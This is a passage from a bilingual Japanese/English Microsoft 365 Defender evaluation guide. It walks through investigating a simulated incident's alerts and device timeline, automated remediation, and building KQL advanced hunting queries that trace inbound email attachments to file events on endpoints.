<span data-ttu-id="7e270-214">アラートプロセスツリーで IP アドレスを選択して、[IP アドレスの詳細] ページを表示します。</span><span class="sxs-lookup"><span data-stu-id="7e270-214">Select the IP address in the alert process tree to view the IP address details page.</span></span>

![コマンドライン引数を指定せずにプロセスを実行して、予期しない動作が発生した場合の警告のスクリーンショット](../../media/mtp/fig8.png) 

<span data-ttu-id="7e270-216">次の図は、[選択された IP アドレスの詳細] ページ ([アラート処理] ツリーの [IP アドレス] をクリック) を示しています。</span><span class="sxs-lookup"><span data-stu-id="7e270-216">The following figure displays the selected IP Address details page (clicking on IP address in the Alert process tree).</span></span>
<span data-ttu-id="7e270-217">![IP アドレスの詳細ページのスクリーンショット](../../media/mtp/fig9.png)</span><span class="sxs-lookup"><span data-stu-id="7e270-217">![Screenshot of the IP address details page](../../media/mtp/fig9.png)</span></span>


<span data-ttu-id="7e270-218">**通知: ユーザーおよび IP アドレス偵察 (SMB) (ソース: Id 用 Microsoft Defender)**</span><span class="sxs-lookup"><span data-stu-id="7e270-218">**Alert: User and IP address reconnaissance (SMB) (Source: Microsoft Defender for Identity)**</span></span>

<span data-ttu-id="7e270-219">列挙サーバーメッセージブロック (SMB) プロトコルを使用して、laterally がネットワークを介して特定の機密性の高いアカウントにアクセスするのに役立つ、最新のユーザーログオン情報を取得することを攻撃者に許可します。</span><span class="sxs-lookup"><span data-stu-id="7e270-219">Enumeration using Server Message Block (SMB) protocol enables attackers to get recent user logon information that helps them move laterally through the network to access a specific sensitive account.</span></span>

<span data-ttu-id="7e270-220">この検出では、SMB セッション列挙がドメインコントローラーに対して実行されたときにアラートがトリガーされます。</span><span class="sxs-lookup"><span data-stu-id="7e270-220">In this detection, an alert is triggered when the SMB session enumeration runs against a domain controller.</span></span>

![ユーザーおよび IP アドレスの偵察に関する Id アラートの Microsoft Defender のスクリーンショット](../../media/mtp/fig10.png) 


### <a name="review-the-device-timeline-microsoft-defender-for-endpoint"></a><span data-ttu-id="7e270-222">デバイスのタイムラインを確認する [エンドポイントの Microsoft Defender]</span><span class="sxs-lookup"><span data-stu-id="7e270-222">Review the device timeline [Microsoft Defender for Endpoint]</span></span>
<span data-ttu-id="7e270-223">このインシデントのさまざまなアラートを調査した後、前に調査したインシデントページに戻ります。</span><span class="sxs-lookup"><span data-stu-id="7e270-223">After exploring the various alerts in this incident, navigate back to the incident page you investigated earlier.</span></span> <span data-ttu-id="7e270-224">このインシデントに関係するデバイスを確認するには、インシデントページの [ **デバイス** ] タブを選択します。</span><span class="sxs-lookup"><span data-stu-id="7e270-224">Select the **Devices** tab in the incident page to review the devices involved in this incident as reported by Microsoft Defender for Endpoint and Microsoft Defender for Identity.</span></span>

<span data-ttu-id="7e270-225">攻撃が実施されたデバイスの名前を選択し、その特定のデバイスのエンティティページを開きます。</span><span class="sxs-lookup"><span data-stu-id="7e270-225">Select the name of the device where the attack was conducted, to open the entity page for that specific device.</span></span> <span data-ttu-id="7e270-226">そのページには、トリガーされた通知と関連するイベントが表示されます。</span><span class="sxs-lookup"><span data-stu-id="7e270-226">In that page, you can see alerts that were triggered and related events.</span></span>

<span data-ttu-id="7e270-227">[ **タイムライン** ] タブを選択してデバイスのタイムラインを開き、デバイス上で監視されているすべてのイベントと動作を、発生したアラートとともに時系列順に表示します。</span><span class="sxs-lookup"><span data-stu-id="7e270-227">Select the **Timeline** tab to open the device timeline and view all events and behaviors observed on the device in chronological order, interspersed with the alerts raised.</span></span>

![動作があるデバイスのタイムラインのスクリーンショット](../../media/mtp/fig11.png) 

<span data-ttu-id="7e270-229">重要な動作の一部を展開すると、プロセスツリーなどの有用な情報を得られます。</span><span class="sxs-lookup"><span data-stu-id="7e270-229">Expanding some of the more interesting behaviors provides useful details, such as process trees.</span></span>

<span data-ttu-id="7e270-230">たとえば、 **疑わしいプロセスインジェクション** のアラートイベントが見つかるまで下にスクロールします。</span><span class="sxs-lookup"><span data-stu-id="7e270-230">For example, scroll down until you find the alert event **Suspicious process injection observed**.</span></span> <span data-ttu-id="7e270-231">下の **プロセスイベント notepad.exe に挿入** されたpowershell.exe を選択し、この動作の完全なプロセスツリーを作業ウィンドウの [ **event entities** ] グラフに表示します。</span><span class="sxs-lookup"><span data-stu-id="7e270-231">Select the **powershell.exe injected to notepad.exe process** event below it, to display the full process tree for this behavior under the **Event entities** graph on the side pane.</span></span> <span data-ttu-id="7e270-232">必要に応じて、検索バーを使用してフィルター処理を行います。</span><span class="sxs-lookup"><span data-stu-id="7e270-232">Use the search bar for filtering if necessary.</span></span>

![選択した PowerShell ファイル作成動作のプロセスツリーのスクリーンショット](../../media/mtp/fig12.png)

### <a name="review-the-user-information-microsoft-cloud-app-security"></a><span data-ttu-id="7e270-234">ユーザー情報を確認する [Microsoft Cloud App Security]</span><span class="sxs-lookup"><span data-stu-id="7e270-234">Review the user information [Microsoft Cloud App Security]</span></span>

<span data-ttu-id="7e270-235">[インシデント] ページで、[ **ユーザー** ] タブを選択して、攻撃に関与するユーザーの一覧を表示します。</span><span class="sxs-lookup"><span data-stu-id="7e270-235">On the incident page, select the **Users** tab to display the list of users involved in the attack.</span></span> <span data-ttu-id="7e270-236">この表には、各ユーザーの **調査の優先度** のスコアを含む、各ユーザーに関する追加情報が含まれています。</span><span class="sxs-lookup"><span data-stu-id="7e270-236">The table contains additional information about each user, including each user’s **Investigation Priority** score.</span></span>

<span data-ttu-id="7e270-237">ユーザー名を選択して、さらに調査を実施できるユーザーのプロファイルページを開きます。</span><span class="sxs-lookup"><span data-stu-id="7e270-237">Select the user name to open the user’s profile page where further investigation can be conducted.</span></span> <span data-ttu-id="7e270-238">[「リスク](https://docs.microsoft.com/cloud-app-security/tutorial-ueba#identify)のあるユーザーの調査」を参照してください。</span><span class="sxs-lookup"><span data-stu-id="7e270-238">[Read more about investigating risky users](https://docs.microsoft.com/cloud-app-security/tutorial-ueba#identify).</span></span>
<br>
<span data-ttu-id="7e270-239">![Cloud App Security のユーザーページのスクリーンショット](../../media/mtp/fig13.png)</span><span class="sxs-lookup"><span data-stu-id="7e270-239">![Screenshot of Cloud App Security user page](../../media/mtp/fig13.png)</span></span>


## <a name="automated-investigation-and-remediation"></a><span data-ttu-id="7e270-240">調査と修復の自動化</span><span class="sxs-lookup"><span data-stu-id="7e270-240">Automated investigation and remediation</span></span>
>[!NOTE]
><span data-ttu-id="7e270-241">このシミュレーションについて説明する前に、次のビデオを見て、自動自己修復の概要、ポータル内での検索方法、およびセキュリティ操作においてどのように役立つかについて理解しておく必要があります。</span><span class="sxs-lookup"><span data-stu-id="7e270-241">Before we walk you through this simulation, watch the following video to get familiar with what automated self-healing is, where to find it in the portal, and how it can help in your security operations:</span></span>

>[!VIDEO https://www.microsoft.com/en-us/videoplayer/embed/RE4BzwB]

<span data-ttu-id="7e270-242">Microsoft 365 セキュリティセンターポータルで、インシデントに移動します。</span><span class="sxs-lookup"><span data-stu-id="7e270-242">Navigate back to the incident in the Microsoft 365 Security Center portal.</span></span> <span data-ttu-id="7e270-243">**インシデント** ページの [ **調査** ] タブには、microsoft Defender For Identity およびエンドポイントの microsoft defender によってトリガーされた自動調査が表示されます。</span><span class="sxs-lookup"><span data-stu-id="7e270-243">The **Investigations** tab in the **Incident** page shows the automated investigations that were triggered by Microsoft Defender for Identity and Microsoft Defender for Endpoint.</span></span> <span data-ttu-id="7e270-244">次のスクリーンショットは、エンドポイントの Defender によってトリガーされた自動調査のみを示しています。</span><span class="sxs-lookup"><span data-stu-id="7e270-244">The screenshot below displays only the automated investigation triggered by Defender for Endpoint.</span></span> <span data-ttu-id="7e270-245">既定では、エンドポイントの Defender は、キューにある成果物を自動的に remediates ます。これにより、修復が必要になります。</span><span class="sxs-lookup"><span data-stu-id="7e270-245">By default, Defender for Endpoint automatically remediates the artifacts found in the queue, which requires remediation.</span></span>

![インシデントに関連する自動調査のスクリーンショット](../../media/mtp/fig14.png)

<span data-ttu-id="7e270-247">調査をトリガーした警告を選択して、[ **調査の詳細** ] ページを開きます。</span><span class="sxs-lookup"><span data-stu-id="7e270-247">Select the alert that triggered an investigation to open the **Investigation details** page.</span></span> <span data-ttu-id="7e270-248">次の詳細が表示されます。</span><span class="sxs-lookup"><span data-stu-id="7e270-248">You’ll see the following details:</span></span>
- <span data-ttu-id="7e270-249">自動調査をトリガーした警告。</span><span class="sxs-lookup"><span data-stu-id="7e270-249">Alert(s) that triggered the automated investigation.</span></span>
- <span data-ttu-id="7e270-250">影響を受けるユーザーとデバイス。</span><span class="sxs-lookup"><span data-stu-id="7e270-250">Impacted users and devices.</span></span> <span data-ttu-id="7e270-251">その他のデバイスでインジケーターが見つかった場合は、これらの追加デバイスも一覧に表示されます。</span><span class="sxs-lookup"><span data-stu-id="7e270-251">If indicators are found on additional devices, these additional devices will be listed as well.</span></span>
- <span data-ttu-id="7e270-252">証拠の一覧。</span><span class="sxs-lookup"><span data-stu-id="7e270-252">List of evidence.</span></span> <span data-ttu-id="7e270-253">ファイル、プロセス、サービス、ドライバー、およびネットワークアドレスなど、検出され分析されたエンティティ。</span><span class="sxs-lookup"><span data-stu-id="7e270-253">The entities found and analyzed, such as files, processes, services, drivers, and network addresses.</span></span> <span data-ttu-id="7e270-254">これらのエンティティは、アラートとの関係があるかどうかを分析し、無害または悪意のあるものとして評価されます。</span><span class="sxs-lookup"><span data-stu-id="7e270-254">These entities are analyzed for possible relationships to the alert and rated as benign or malicious.</span></span>
- <span data-ttu-id="7e270-255">検出された脅威。</span><span class="sxs-lookup"><span data-stu-id="7e270-255">Threats found.</span></span> <span data-ttu-id="7e270-256">調査中に検出された既知の脅威。</span><span class="sxs-lookup"><span data-stu-id="7e270-256">Known threats that are found during the investigation.</span></span>

>[!NOTE]
><span data-ttu-id="7e270-257">タイミングによっては、自動調査がまだ実行中の場合があります。</span><span class="sxs-lookup"><span data-stu-id="7e270-257">Depending on timing, the automated investigation might still be running.</span></span> <span data-ttu-id="7e270-258">証拠を収集して分析し、結果を確認する前に、プロセスが完了するまで数分待機します。</span><span class="sxs-lookup"><span data-stu-id="7e270-258">Wait a few minutes for the process to complete before you collect and analyze the evidence and review the results.</span></span> <span data-ttu-id="7e270-259">[ **調査の詳細** ] ページを更新して、最新の調査結果を取得します。</span><span class="sxs-lookup"><span data-stu-id="7e270-259">Refresh the **Investigation details** page to get the latest findings.</span></span>

![調査の詳細ページのスクリーンショット](../../media/mtp/fig15.png)

<span data-ttu-id="7e270-261">自動化された調査の間、エンドポイントの Microsoft Defender は notepad.exe プロセスを特定しました。これは、修復が必要な成果物の1つとして挿入されています。</span><span class="sxs-lookup"><span data-stu-id="7e270-261">During the automated investigation, Microsoft Defender for Endpoint identified the notepad.exe process, which was injected as one of the artifacts requiring remediation.</span></span> <span data-ttu-id="7e270-262">エンドポイントの Defender は自動修復の一部として、不審なプロセスインジェクションを自動的に停止します。</span><span class="sxs-lookup"><span data-stu-id="7e270-262">Defender for Endpoint automatically stops the suspicious process injection as part of the automated remediation.</span></span> 

<span data-ttu-id="7e270-263">テストデバイス上の実行中のプロセスの一覧から <i>notepad.exe</i> が表示されなくなります。</span><span class="sxs-lookup"><span data-stu-id="7e270-263">You can see <i>notepad.exe</i> disappear from the list of running processes on the test device.</span></span>

## <a name="resolve-the-incident"></a><span data-ttu-id="7e270-264">インシデントを解決する</span><span class="sxs-lookup"><span data-stu-id="7e270-264">Resolve the incident</span></span>

<span data-ttu-id="7e270-265">調査が完了し、修復が確認されたら、インシデントを閉じます。</span><span class="sxs-lookup"><span data-stu-id="7e270-265">After the investigation is complete and confirmed to be remediated, close the incident.</span></span>

<span data-ttu-id="7e270-266">[ **インシデントの管理** ] を選択します。</span><span class="sxs-lookup"><span data-stu-id="7e270-266">Select **Manage incident**.</span></span> <span data-ttu-id="7e270-267">[ **インシデントを解決** する] の状態を設定し、関連する分類を選択します。</span><span class="sxs-lookup"><span data-stu-id="7e270-267">Set the status to **Resolve incident** and select the relevant classification.</span></span>

<span data-ttu-id="7e270-268">インシデントが解決されると、Microsoft 365 セキュリティセンターおよび関連するポータルで、関連付けられているすべての警告が閉じられます。</span><span class="sxs-lookup"><span data-stu-id="7e270-268">When the incident is resolved, it closes all of the associated alerts in Microsoft 365 Security Center and in the related portals.</span></span>

![開いている [インシデントの管理] パネルがある [インシデント] ページのスクリーンショット。インシデントを解決するためにスイッチをクリックできます。](../../media/mtp/fig16.png) 

<br>
<span data-ttu-id="7e270-270">これにより、インシデント管理および自動調査と修復のシナリオに対する攻撃シミュレーションがラップされます。</span><span class="sxs-lookup"><span data-stu-id="7e270-270">This wraps up the attack simulation for the incident management and automated investigation and remediation scenarios.</span></span> <span data-ttu-id="7e270-271">次のシミュレーションでは、悪意のある可能性のあるファイルを事前に脅威から探すことができるようになります。</span><span class="sxs-lookup"><span data-stu-id="7e270-271">The next simulation will take you through proactive threat hunting for potentially malicious files.</span></span> 

## <a name="advanced-hunting-scenario"></a><span data-ttu-id="7e270-272">高度な検索のシナリオ</span><span class="sxs-lookup"><span data-stu-id="7e270-272">Advanced hunting scenario</span></span>

>[!NOTE]
><span data-ttu-id="7e270-273">シミュレーションについて説明する前に、次のビデオを見て、高度な検索の概念について理解し、ポータルで検索できる場所を確認し、セキュリティの操作でどのように役立つかを確認してください。</span><span class="sxs-lookup"><span data-stu-id="7e270-273">Before we walk you through the simulation, watch the following video to understand the advanced hunting concepts, see where you can find it in the portal, and know how it can help you in your security operations:</span></span>

>[!VIDEO https://www.microsoft.com/videoplayer/embed/RE4Bp7O]

### <a name="hunting-environment-requirements"></a><span data-ttu-id="7e270-274">探している環境の要件</span><span class="sxs-lookup"><span data-stu-id="7e270-274">Hunting environment requirements</span></span>
<span data-ttu-id="7e270-275">このシナリオでは、1つの内部メールボックスとデバイスが必要です。</span><span class="sxs-lookup"><span data-stu-id="7e270-275">There's a single internal mailbox and device required for this scenario.</span></span> <span data-ttu-id="7e270-276">テストメッセージを送信するには、外部の電子メールアカウントも必要です。</span><span class="sxs-lookup"><span data-stu-id="7e270-276">You'll also need an external email account to send the test message.</span></span>

1.  <span data-ttu-id="7e270-277">テナントで [Microsoft 365 Defender が有効になっ](https://docs.microsoft.com/microsoft-365/security/mtp/mtp-enable#starting-the-service)ていることを確認します。</span><span class="sxs-lookup"><span data-stu-id="7e270-277">Verify that your tenant has [enabled Microsoft 365 Defender](https://docs.microsoft.com/microsoft-365/security/mtp/mtp-enable#starting-the-service).</span></span>
2.  <span data-ttu-id="7e270-278">電子メールの受信に使用するターゲットメールボックスを識別します。</span><span class="sxs-lookup"><span data-stu-id="7e270-278">Identify a target mailbox to be used for receiving email.</span></span>
    <span data-ttu-id="7e270-279">a.</span><span class="sxs-lookup"><span data-stu-id="7e270-279">a.</span></span>  <span data-ttu-id="7e270-280">このメールボックスは、Microsoft Defender for Office 365 b で監視する必要があります。</span><span class="sxs-lookup"><span data-stu-id="7e270-280">This mailbox must be monitored by Microsoft Defender for Office 365 b.</span></span>  <span data-ttu-id="7e270-281">要件3のデバイスがこのメールボックスにアクセスする必要がある</span><span class="sxs-lookup"><span data-stu-id="7e270-281">The device from requirement 3 needs to access this mailbox</span></span>
3.  <span data-ttu-id="7e270-282">テストデバイスを構成する: a。</span><span class="sxs-lookup"><span data-stu-id="7e270-282">Configure a test device: a.</span></span>  <span data-ttu-id="7e270-283">Windows 10 バージョン1903以降のバージョンを使用していることを確認してください。</span><span class="sxs-lookup"><span data-stu-id="7e270-283">Make sure you are using Windows 10 version 1903 or later version.</span></span>
    <span data-ttu-id="7e270-284">b.</span><span class="sxs-lookup"><span data-stu-id="7e270-284">b.</span></span>  <span data-ttu-id="7e270-285">テストデバイスをテストドメインに参加させる。</span><span class="sxs-lookup"><span data-stu-id="7e270-285">Join the test device to the test domain.</span></span>
    <span data-ttu-id="7e270-286">c.</span><span class="sxs-lookup"><span data-stu-id="7e270-286">c.</span></span>  <span data-ttu-id="7e270-287">[Windows Defender ウイルス対策を有効](https://docs.microsoft.com/windows/security/threat-protection/windows-defender-antivirus/configure-windows-defender-antivirus-features)にします。</span><span class="sxs-lookup"><span data-stu-id="7e270-287">[Turn on Windows Defender Antivirus](https://docs.microsoft.com/windows/security/threat-protection/windows-defender-antivirus/configure-windows-defender-antivirus-features).</span></span> <span data-ttu-id="7e270-288">Windows Defender ウイルス対策を有効にする際に問題が発生した場合は、 [このトラブルシューティングのトピック](https://docs.microsoft.com/windows/security/threat-protection/microsoft-defender-atp/troubleshoot-onboarding#ensure-that-windows-defender-antivirus-is-not-disabled-by-a-policy)を参照してください。</span><span class="sxs-lookup"><span data-stu-id="7e270-288">If you are having trouble enabling Windows Defender Antivirus, see [this troubleshooting topic](https://docs.microsoft.com/windows/security/threat-protection/microsoft-defender-atp/troubleshoot-onboarding#ensure-that-windows-defender-antivirus-is-not-disabled-by-a-policy).</span></span>
    <span data-ttu-id="7e270-289">d. </span><span class="sxs-lookup"><span data-stu-id="7e270-289">d.</span></span>  <span data-ttu-id="7e270-290">[エンドポイントの Microsoft Defender にオンボード](https://docs.microsoft.com/windows/security/threat-protection/microsoft-defender-atp/configure-endpoints)。</span><span class="sxs-lookup"><span data-stu-id="7e270-290">[Onboard to Microsoft Defender for Endpoint](https://docs.microsoft.com/windows/security/threat-protection/microsoft-defender-atp/configure-endpoints).</span></span>

### <a name="run-the-simulation"></a><span data-ttu-id="7e270-291">シミュレーションを実行する</span><span class="sxs-lookup"><span data-stu-id="7e270-291">Run the simulation</span></span>
1.  <span data-ttu-id="7e270-292">外部の電子メールアカウントから、「テスト環境の要件」セクションのステップ2で識別されたメールボックスに電子メールを送信します。</span><span class="sxs-lookup"><span data-stu-id="7e270-292">From an external email account, send an email to the mailbox identified in step 2 of the test environment requirements section.</span></span> <span data-ttu-id="7e270-293">既存の電子メールフィルターポリシーを使用して許可される添付ファイルを含めます。</span><span class="sxs-lookup"><span data-stu-id="7e270-293">Include an attachment that will be allowed through any existing email filter policies.</span></span>  <span data-ttu-id="7e270-294">このファイルは、悪意または実行可能である必要はありません。</span><span class="sxs-lookup"><span data-stu-id="7e270-294">This file does not need to be malicious or an executable.</span></span> <span data-ttu-id="7e270-295">推奨されるファイルの種類は、 <i>.pdf</i>、 <i>.exe</i> (許可されている場合)、または Word ファイルなどの Office ドキュメントです。</span><span class="sxs-lookup"><span data-stu-id="7e270-295">Suggested file types are <i>.pdf</i>, <i>.exe</i> (if allowed), or Office document such as a Word file.</span></span>
2.  <span data-ttu-id="7e270-296">[テスト環境の要件] セクションのステップ3で定義されたデバイスから、送信された電子メールを開きます。</span><span class="sxs-lookup"><span data-stu-id="7e270-296">Open the sent email from the device configured as defined in step 3 of the test environment requirements section.</span></span> <span data-ttu-id="7e270-297">添付ファイルを開くか、デバイスにファイルを保存します。</span><span class="sxs-lookup"><span data-stu-id="7e270-297">Either open the attachment or save the file to the device.</span></span>


<span data-ttu-id="7e270-298">**検索を探す**</span><span class="sxs-lookup"><span data-stu-id="7e270-298">**Go hunting**</span></span>
1.  <span data-ttu-id="7e270-299">Security.microsoft.com ポータルを開きます。</span><span class="sxs-lookup"><span data-stu-id="7e270-299">Open the security.microsoft.com portal.</span></span>

2.  <span data-ttu-id="7e270-300">[検索] **> [詳細** ] を探します。</span><span class="sxs-lookup"><span data-stu-id="7e270-300">Navigate to **Hunting > Advanced hunting**.</span></span>

    ![M365 セキュリティセンターポータルのナビゲーションバーでの高度な検索のスクリーンショット](../../media/mtp/fig17.png) 

3.  <span data-ttu-id="7e270-302">電子メールイベントを収集することによって開始するクエリを作成します。</span><span class="sxs-lookup"><span data-stu-id="7e270-302">Build a query that starts by gathering email events.</span></span>

    1.  <span data-ttu-id="7e270-303">[クエリ] ウィンドウで、[新規] を選択します。</span><span class="sxs-lookup"><span data-stu-id="7e270-303">From the query pane, select New.</span></span>
    
    1.  <span data-ttu-id="7e270-304">[EmailEvents] テーブルをスキーマからダブルクリックします。</span><span class="sxs-lookup"><span data-stu-id="7e270-304">Double-click on the EmailEvents table from the schema.</span></span>

        ```
        EmailEvents 
        ```                                        

    1.  <span data-ttu-id="7e270-305">時間枠を過去24時間に変更します。</span><span class="sxs-lookup"><span data-stu-id="7e270-305">Change the time frame to the last 24 hours.</span></span> <span data-ttu-id="7e270-306">上記のシミュレーションを実行したときに送信した電子メールが過去24時間であったとして、そうでない場合は、時間枠を変更します。</span><span class="sxs-lookup"><span data-stu-id="7e270-306">Assuming the email you sent when you ran the simulation above was in the past 24 hours, otherwise change the time frame.</span></span>
    
        ![タイムフレームを変更できる場所のスクリーンショット。](../../media/mtp/fig18.png) 

    1.  <span data-ttu-id="7e270-309">クエリを実行します。</span><span class="sxs-lookup"><span data-stu-id="7e270-309">Run the query.</span></span>  <span data-ttu-id="7e270-310">パイロットの環境によっては、多くの結果が得られる場合があります。</span><span class="sxs-lookup"><span data-stu-id="7e270-310">You may have many results depending on the environment for the pilot.</span></span>  

        > [!NOTE]
        > <span data-ttu-id="7e270-311">データの戻りを制限するには、フィルターオプションの次の手順を参照してください。</span><span class="sxs-lookup"><span data-stu-id="7e270-311">See the next step for filtering options to limit data return.</span></span>

        ![高度な検索クエリ結果のスクリーンショット](../../media/mtp/fig19.png) 

        > [!NOTE]
        > <span data-ttu-id="7e270-313">高度な検索では、クエリ結果が表形式のデータとして表示されます。</span><span class="sxs-lookup"><span data-stu-id="7e270-313">Advanced hunting displays query results as tabular data.</span></span> <span data-ttu-id="7e270-314">グラフなどの他の形式のデータの表示を選択することもできます。</span><span class="sxs-lookup"><span data-stu-id="7e270-314">You can also opt to view the data in other format types such as charts.</span></span>    

    1.  <span data-ttu-id="7e270-315">結果を確認し、開いた電子メールを識別できるかどうかを確認します。</span><span class="sxs-lookup"><span data-stu-id="7e270-315">Look at the results and see if you can identify the email you opened.</span></span>  <span data-ttu-id="7e270-316">高度な検索でメッセージが表示されるまでに最大2時間かかる場合があります。</span><span class="sxs-lookup"><span data-stu-id="7e270-316">It may take up to 2 hours for the message to show up in advanced hunting.</span></span> <span data-ttu-id="7e270-317">メール環境が大きく、多くの結果がある場合は、[ **フィルターの表示] オプション** を使用してメッセージを検索することもできます。</span><span class="sxs-lookup"><span data-stu-id="7e270-317">If the email environment is large and there are many results, you might want to use the **Show Filters option** to find the message.</span></span> 

   <span data-ttu-id="7e270-318">このサンプルでは、電子メールは Yahoo アカウントから送信されました。</span><span class="sxs-lookup"><span data-stu-id="7e270-318">In the sample, the email was sent from a Yahoo account.</span></span> <span data-ttu-id="7e270-319">[ **+** SenderFromDomain] セクションの下にある **yahoo.com** の横のアイコンをクリックし、[ **適用** ] をクリックして、選択したドメインをクエリに追加します。</span><span class="sxs-lookup"><span data-stu-id="7e270-319">Click the **+** icon beside **yahoo.com** under the SenderFromDomain section and then click **Apply** to add the selected domain to the query.</span></span>  <span data-ttu-id="7e270-320">テストメッセージの送信に使用したドメインまたはメールアカウントを使用します。ステップ1の手順1では、シミュレーションを実行して結果をフィルター処理します。</span><span class="sxs-lookup"><span data-stu-id="7e270-320">Use the domain or email account that was used to send the test message in step 1 of Run the Simulation to filter your results.</span></span>  <span data-ttu-id="7e270-321">クエリをもう一度実行して、シミュレーションからのメッセージが表示されることを確認するために、小さな結果セットを取得します。</span><span class="sxs-lookup"><span data-stu-id="7e270-321">Run the query again to get a smaller result set to verify that you see the message from the simulation.</span></span>
   
        ![Screenshot of the filters. Use filters to narrow down the search, and find what you’re looking for faster.](../../media/mtp/fig20.png) 

        ```console
        EmailEvents 
        | where SenderMailFromDomain == "yahoo.com"
        ```

    1.  <span data-ttu-id="7e270-322">クエリから結果の行をクリックして、レコードを検査できるようにします。</span><span class="sxs-lookup"><span data-stu-id="7e270-322">Click the resulting rows from the query so you can inspect the record.</span></span>
   
        ![高度な検索結果が選択されたときに開く、[レコードの検査] パネルのスクリーンショット](../../media/mtp/fig21.png) 

4.  <span data-ttu-id="7e270-324">これで、電子メールが表示されることを確認できたので、添付ファイルのフィルターを追加します。</span><span class="sxs-lookup"><span data-stu-id="7e270-324">Now that you have verified that you can see the email, add a filter for the attachments.</span></span> <span data-ttu-id="7e270-325">環境内の添付ファイルを含むすべての電子メールにフォーカスします。</span><span class="sxs-lookup"><span data-stu-id="7e270-325">Focus on all emails with attachments in the environment.</span></span> <span data-ttu-id="7e270-326">このシナリオでは、受信メールに焦点を絞り、環境から送信されるものではありません。</span><span class="sxs-lookup"><span data-stu-id="7e270-326">For this scenario, focus on inbound emails, not those that are being sent out from your environment.</span></span> <span data-ttu-id="7e270-327">追加したフィルターを削除してメッセージを見つけ、"|" を追加します。 **attachmentcount > 0** および **emaildirection** "  ==  **Inbound" "**</span><span class="sxs-lookup"><span data-stu-id="7e270-327">Remove any filters you have added to locate your message and add “| where **AttachmentCount > 0** and **EmailDirection** == **“Inbound””**</span></span>

    <span data-ttu-id="7e270-328">次のクエリは、すべての電子メールイベントの最初のクエリよりも短い一覧で結果を表示します。</span><span class="sxs-lookup"><span data-stu-id="7e270-328">The following query will show you the result with a shorter list than your initial query for all email events:</span></span>

    ```console
    EmailEvents 
    | where AttachmentCount > 0 and EmailDirection == "Inbound"

    ```

5.  <span data-ttu-id="7e270-329">次に、添付ファイルについての情報 (ファイル名、ハッシュなど) を結果セットに追加します。</span><span class="sxs-lookup"><span data-stu-id="7e270-329">Next, include the information about the attachment (such as: file name, hashes) to your result set.</span></span> <span data-ttu-id="7e270-330">これを行うには、 **Emailattachmentinfo** テーブルに参加します。</span><span class="sxs-lookup"><span data-stu-id="7e270-330">To do so, join the **EmailAttachmentInfo** table.</span></span> <span data-ttu-id="7e270-331">この場合、参加に使用する共通のフィールドは、 **Networkmessageid** と **RecipientObjectId** です。</span><span class="sxs-lookup"><span data-stu-id="7e270-331">The common fields to use for joining, in this case are **NetworkMessageId** and **RecipientObjectId**.</span></span>

<span data-ttu-id="7e270-332">次のクエリにも追加行 "|" が含まれています。 **プロジェクト-** 電子メールアドレスと、次の手順で追加するファイル操作に関連したタイムスタンプに関連するタイムスタンプを識別するのに役立つ、電子メールの名前を変更します。</span><span class="sxs-lookup"><span data-stu-id="7e270-332">The following query also includes an additional line “| **project-rename EmailTimestamp=Timestamp** ” that'll help identify which timestamp was related to the email versus timestamps related to file actions that you'll add in the next step.</span></span>

    ```console
    EmailEvents 
    | where AttachmentCount > 0 and EmailDirection == "Inbound"
    | project-rename EmailTimestamp=Timestamp 
    | join EmailAttachmentInfo on NetworkMessageId, RecipientObjectId
    ```

6.  <span data-ttu-id="7e270-333">次に、 **Emailattachmentinfo** テーブルの **SHA256** 値を使用して、そのハッシュの **devicefileevents** (エンドポイントで発生したファイルアクション) を検索します。</span><span class="sxs-lookup"><span data-stu-id="7e270-333">Next, use the **SHA256** value from the **EmailAttachmentInfo** table to find **DeviceFileEvents** (file actions that happened on the endpoint) for that hash.</span></span>  <span data-ttu-id="7e270-334">ここに示す共通のフィールドは、添付ファイルの SHA256 ハッシュです。</span><span class="sxs-lookup"><span data-stu-id="7e270-334">The common field here will be the SHA256 hash for the attachment.</span></span>

    <span data-ttu-id="7e270-335">結果の表に、デバイス名、実行された操作 (この例では、FileCreated イベントのみが含まれます)、ファイルが格納されている場所などのエンドポイント (エンドポイントの Microsoft Defender) の詳細が含まれるようになりました。</span><span class="sxs-lookup"><span data-stu-id="7e270-335">The resulting table now includes details from the endpoint (Microsoft Defender for Endpoint) such as device name, what action was done (in this case, filtered to only include FileCreated events), and where the file was stored.</span></span> <span data-ttu-id="7e270-336">プロセスに関連付けられているアカウント名も含まれます。</span><span class="sxs-lookup"><span data-stu-id="7e270-336">The account name associated with the process will also be included.</span></span>

    ```console
    EmailEvents 
    | where AttachmentCount > 0 and EmailDirection == "Inbound"
    | project-rename EmailTimestamp=Timestamp 
    | join EmailAttachmentInfo on NetworkMessageId, RecipientObjectId 
    | join DeviceFileEvents on SHA256 
    | where ActionType == "FileCreated"
    ```

<span data-ttu-id="7e270-337">これで、ユーザーが添付ファイルを開いた、または保存したすべての受信メールを識別するクエリが作成されました。</span><span class="sxs-lookup"><span data-stu-id="7e270-337">You've now created a query that'll identify all inbound emails where the user opened or saved the attachment.</span></span> <span data-ttu-id="7e270-338">また、このクエリを調整して、特定の送信者ドメイン、ファイルサイズ、ファイルの種類などをフィルター処理することもできます。</span><span class="sxs-lookup"><span data-stu-id="7e270-338">You can also refine this query to filter for specific sender domains, file sizes, file types, and so on.</span></span>

7.  <span data-ttu-id="7e270-339">関数は特別な種類の結合であり、流行、署名者、発行者の情報などのファイルについて、より多くの TI データをプルできるようにします。 ファイルの詳細を取得するには、 **Fileprofile ()** 関数エンリッチメントを使用します。</span><span class="sxs-lookup"><span data-stu-id="7e270-339">Functions are a special kind of join, which let you pull more TI data about a file like its prevalence, signer and issuer info, etc.  To get more details on the file, use the **FileProfile()** function enrichment:</span></span>

    ```console
    EmailEvents 
    | where AttachmentCount > 0 and EmailDirection == "Inbound"
    | project-rename EmailTimestamp=Timestamp 
    | join EmailAttachmentInfo on NetworkMessageId, RecipientObjectId
    | join DeviceFileEvents on SHA256 
    | where ActionType == "FileCreated"
    | distinct SHA1
    | invoke FileProfile()
    ```


<span data-ttu-id="7e270-340">**検出を作成する**</span><span class="sxs-lookup"><span data-stu-id="7e270-340">**Create a detection**</span></span>

<span data-ttu-id="7e270-341">後で発生する可能性がある場合に **通知を取得** する情報を識別するクエリを作成したら、クエリからカスタム検出を作成できます。</span><span class="sxs-lookup"><span data-stu-id="7e270-341">Once you have created a query that identifies information that you'd like to **get alerted** about if they happen in the future, you can create a custom detection from the query.</span></span> 

